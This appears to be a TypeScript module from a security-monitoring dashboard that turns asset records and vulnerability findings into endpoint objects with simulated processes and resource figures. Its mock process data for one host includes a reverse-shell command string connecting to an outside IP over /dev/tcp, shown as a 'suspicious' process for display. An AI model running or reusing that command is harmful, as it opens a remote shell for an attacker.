import { isIsolated, getTerminatedProcesses } from "../services/assetState";

export interface SystemProcess {
  pid: number;
  name: string;
  cpu: number;
  memory: number;
  path: string;
  status: "running" | "suspicious" | "terminated";
}

export interface CVEInfo {
  id: string;
  severity: string;
  score: number;
  description: string;
  publishDate: string;
}

export interface Endpoint {
  id: string;
  hostname: string;
  os: "Windows Server" | "Ubuntu Server" | "macOS" | "RedHat Linux";
  osVersion: string;
  ip: string;
  mac: string;
  status: "online" | "offline" | "isolated";
  cves: CVEInfo[];
  processes: SystemProcess[];
  cpuUsage: number;
  memoryUsage: number;
  diskUsage: number;
  criticalAlertsCount: number;
  highAlertsCount: number;
  lastSeen: string;
  policyGroup: string;
}

export function mapCategory(vulnCategory: string | null | undefined): string {
  if (!vulnCategory) return "Uncategorized";
  const catMap: Record<string, string> = {
    "weak_credential": "Credential Access",
    "unpatched_service": "Initial Access",
    "misconfiguration": "Misconfiguration",
    "privilege_escalation_vuln": "Privilege Escalation",
    "lateral_movement_vector": "Lateral Movement"
  };
  return catMap[vulnCategory] || vulnCategory;
}

export function mapOsType(osType: string | null | undefined): "Windows Server" | "Ubuntu Server" | "macOS" | "RedHat Linux" {
  if (!osType) return "Ubuntu Server";
  const val = osType.toLowerCase();
  if (val.includes("win")) return "Windows Server";
  if (val.includes("ubuntu")) return "Ubuntu Server";
  if (val.includes("mac") || val.includes("osx")) return "macOS";
  if (val.includes("redhat") || val.includes("rhel")) return "RedHat Linux";
  if (val.includes("linux")) return "Ubuntu Server";
  return "Ubuntu Server";
}

export function getOsVersion(os: string): string {
  if (os === "Windows Server") return "2022 Datacenter";
  if (os === "macOS") return "Sonoma 14.4";
  if (os === "RedHat Linux") return "8.6 Enterprise";
  return "22.04 LTS";
}

export function generateMac(hostname: string): string {
  let hash = 0;
  for (let i = 0; i < hostname.length; i++) {
    hash = hostname.charCodeAt(i) + ((hash << 5) - hash);
  }
  const parts = ["00", "50", "56"];
  for (let i = 0; i < 3; i++) {
    const byte = (hash >> (i * 8)) & 0xff;
    parts.push(byte.toString(16).padStart(2, "0").toUpperCase());
  }
  return parts.join(":");
}

export function getCpuUsage(hostname: string): number {
  let hash = 0;
  for (let i = 0; i < hostname.length; i++) {
    hash = hostname.charCodeAt(i) + ((hash << 5) - hash);
  }
  return Math.abs(hash % 35) + 5;
}

export function getMemoryUsage(hostname: string): number {
  let hash = 0;
  for (let i = 0; i < hostname.length; i++) {
    hash = hostname.charCodeAt(i) + ((hash << 5) - hash);
  }
  return Math.abs(hash % 50) + 30;
}

export function getDiskUsage(hostname: string): number {
  let hash = 0;
  for (let i = 0; i < hostname.length; i++) {
    hash = hostname.charCodeAt(i) + ((hash << 5) - hash);
  }
  return Math.abs(hash % 40) + 20;
}

export function getPolicyGroup(os: string): string {
  if (os === "Windows Server") return "Domain Controllers";
  if (os === "macOS") return "Corporate Workstations";
  if (os === "RedHat Linux" || os === "Ubuntu Server") return "Web Server Farm";
  return "Default Segment";
}

export function getProcessesForAsset(assetId: string, hostname: string, os: string): SystemProcess[] {
  let baseProcesses: SystemProcess[] = [];
  
  if (hostname === "ad-dc-windows-01") {
    baseProcesses = [
      { pid: 652, name: "lsass.exe", cpu: 1.2, memory: 342, path: "C:\\Windows\\System32\\lsass.exe", status: "suspicious" },
      { pid: 412, name: "services.exe", cpu: 0.1, memory: 45, path: "C:\\Windows\\System32\\services.exe", status: "running" },
      { pid: 1024, name: "dns.exe", cpu: 2.5, memory: 890, path: "C:\\Windows\\System32\\dns.exe", status: "running" }
    ];
  } else if (hostname === "web-prod-ubuntu-01") {
    baseProcesses = [
      { pid: 14452, name: "nginx", cpu: 12.4, memory: 180, path: "/usr/sbin/nginx", status: "running" },
      { pid: 19890, name: "sshd: root@pts/0", cpu: 45.8, memory: 89, path: "/usr/sbin/sshd", status: "suspicious" },
      { pid: 21002, name: "python3 -c import socket...", cpu: 28.1, memory: 54, path: "/usr/bin/python3", status: "suspicious" }
    ];
  } else if (hostname === "db-stage-postgres") {
    baseProcesses = [
      { pid: 892, name: "postgres", cpu: 0.1, memory: 1420, path: "/usr/bin/postgres", status: "running" },
      { pid: 31102, name: "sh -i >& /dev/tcp/185.220.101.44/443", cpu: 1.5, memory: 12, path: "/bin/sh", status: "suspicious" }
    ];
  } else if (hostname === "workstation-12") {
    baseProcesses = [
      { pid: 489, name: "Slack", cpu: 4.5, memory: 540, path: "/Applications/Slack.app", status: "running" },
      { pid: 902, name: "Terminal", cpu: 0.2, memory: 110, path: "/Applications/Utilities/Terminal.app", status: "running" }
    ];
  } else if (hostname === "workstation-09") {
    baseProcesses = [
      { pid: 1120, name: "chrome.exe", cpu: 1.1, memory: 610, path: "C:\\Program Files\\Google\\Chrome\\chrome.exe", status: "running" }
    ];
  } else {
    // Fallback based on OS
    if (os === "Windows Server") {
      baseProcesses = [
        { pid: 320, name: "wininit.exe", cpu: 0.0, memory: 12, path: "C:\\Windows\\System32\\wininit.exe", status: "running" },
        { pid: 540, name: "svchost.exe", cpu: 0.2, memory: 85, path: "C:\\Windows\\System32\\svchost.exe", status: "running" }
      ];
    } else if (os === "macOS") {
      baseProcesses = [
        { pid: 1, name: "launchd", cpu: 0.0, memory: 15, path: "/sbin/launchd", status: "running" },
        { pid: 240, name: "WindowServer", cpu: 2.1, memory: 120, path: "/System/Library/CoreServices/WindowServer", status: "running" }
      ];
    } else {
      baseProcesses = [
        { pid: 1, name: "systemd", cpu: 0.0, memory: 8, path: "/sbin/init", status: "running" },
        { pid: 910, name: "cron", cpu: 0.0, memory: 4, path: "/usr/sbin/cron", status: "running" }
      ];
    }
  }

  // Apply terminated status if relevant
  const terminatedPids = getTerminatedProcesses(assetId);
  return baseProcesses.map(p => {
    if (terminatedPids.has(p.pid)) {
      return { ...p, status: "terminated" as const };
    }
    return p;
  });
}

export function mapAssetToEndpoint(asset: any, dbFindings: any[]): Endpoint {
  const assetFindings = dbFindings.filter((f) => f.asset_id === asset.id && f.status === "open");
  const mappedOs = mapOsType(asset.os_type);
  
  const cves = assetFindings
    .filter((f) => f.cve_id)
    .map((f) => ({
      id: f.cve_id!,
      severity: (f.severity || "low").toLowerCase(),
      score: f.cvss_score || 0,
      description: f.description || "",
      publishDate: f.detected_at || asset.created_at || new Date().toISOString()
    }));

  const criticalAlertsCount = assetFindings.filter((f) => f.status === "open" && f.severity?.toLowerCase() === "critical").length;
  const highAlertsCount = assetFindings.filter((f) => f.status === "open" && f.severity?.toLowerCase() === "high").length;
  
  const status = isIsolated(asset.id, asset.hostname) ? "isolated" : "online";
  const processes = getProcessesForAsset(asset.id, asset.hostname, mappedOs);

  return {
    id: asset.id,
    hostname: asset.hostname,
    os: mappedOs,
    osVersion: getOsVersion(mappedOs),
    ip: asset.ip_address || "0.0.0.0",
    mac: generateMac(asset.hostname),
    status,
    cves,
    processes,
    cpuUsage: getCpuUsage(asset.hostname),
    memoryUsage: getMemoryUsage(asset.hostname),
    diskUsage: getDiskUsage(asset.hostname),
    criticalAlertsCount,
    highAlertsCount,
    lastSeen: asset.created_at || new Date().toISOString(),
    policyGroup: getPolicyGroup(mappedOs)
  };
}
